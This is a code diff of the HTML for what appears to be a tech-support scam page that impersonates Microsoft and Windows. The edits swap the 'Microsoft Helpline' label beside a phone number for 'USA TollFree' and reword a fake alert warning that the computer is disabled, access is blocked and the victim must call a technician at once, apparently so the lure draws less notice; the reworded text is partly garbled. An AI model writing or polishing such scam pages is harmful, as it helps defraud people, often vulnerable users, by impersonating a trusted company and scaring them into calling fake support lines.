@@ -564,7 +564,7 @@
 
 
 
-                 (Microsoft Helpline)</span></span>
+                 (USA TollFree)</span></span>
             </div>
         </div>
         <div class="col-md-12">
@@ -595,7 +595,7 @@
 
 
 
-                 (Microsoft Helpline)</span>
+                 (USA TollFree)</span>
     </div>
     <div id="bottom">
         <img id="badge" src="microsoft.png"><span class="title3">Windows</span>
@@ -645,7 +645,7 @@
 
 
 
-                 (Microsoft Helpline) </strong></p>
+                 (USA TollFree) </strong></p>
     <div class="action_buttons"><a class="active" id="leave_page"
                                    style="cursor: pointer; color: #FFFFFF !important;">OK</a> <a class="active"
                                                                                                  id="leave_page"
@@ -656,7 +656,7 @@
 <div id="welcomeDiv"
      style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  "
      class="answer_list">
-    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not restart or use your computer. <br> Your computer disabled. Call Microsoft Now. <br> Access is block to this computer due to security reason. <br> Contact us immediately. Our technician will help you solve the problem.</p>
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Don't use or restart your machine. <br> Your computer isn't working. You should dial Windows. <br> Access is the computer's block security reason. <br> Please reach out to us right away. You can solve the issue with the aid of a technician.</p>
 
 
 </div>
